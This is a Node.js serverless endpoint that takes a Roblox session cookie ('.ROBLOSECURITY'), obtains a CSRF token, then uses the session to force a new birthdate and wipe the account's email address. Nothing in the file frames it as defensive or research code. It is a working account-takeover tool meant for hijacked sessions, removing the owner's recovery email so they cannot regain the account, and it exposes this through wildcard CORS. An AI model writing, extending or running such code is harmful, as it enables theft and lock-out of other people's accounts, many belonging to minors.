const axios = require('axios');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ success: false, message: 'Method Not Allowed' });
    }

    const { cookie, day, month, year } = req.body;

    if (!cookie) {
        return res.status(400).json({ success: false, message: 'Cookie is required.' });
    }

    const headers = {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    };

    try {
        let csrfToken = '';
        try {
            await axios.post('https://auth.roblox.com/v1/logout', {}, { headers });
        } catch (error) {
            if (error.response && error.response.headers['x-csrf-token']) {
                csrfToken = error.response.headers['x-csrf-token'];
                headers['X-CSRF-TOKEN'] = csrfToken;
            } else {
                return res.status(401).json({ success: false, message: 'Invalid cookie or dead session.' });
            }
        }

        let results = { ageForced: false, emailRemoved: false, messages: [] };

        if (day && month && year) {
            try {
                await axios.post('https://accountsettings.roblox.com/v1/birthdate', {
                    birthMonth: parseInt(month),
                    birthDay: parseInt(day),
                    birthYear: parseInt(year)
                }, { headers });
                results.ageForced = true;
                results.messages.push("Age forcefully updated.");
            } catch (err) {
                results.messages.push(`Age update failed: ${err.response ? err.response.status : err.message}`);
            }
        }

        try {
            await axios.post('https://accountsettings.roblox.com/v1/email', {
                emailAddress: ""
            }, { headers });
            results.emailRemoved = true;
            results.messages.push("Email successfully wiped.");
        } catch (err) {
            if (err.response && err.response.status === 403) {
                results.messages.push("Email wipe blocked: Roblox requires password for this endpoint.");
            } else {
                results.messages.push(`Email wipe failed: ${err.response ? err.response.status : err.message}`);
            }
        }

        res.status(200).json({ success: true, data: results });

    } catch (error) {
        res.status(500).json({ success: false, message: 'Internal Server Error', error: error.message });
    }
}
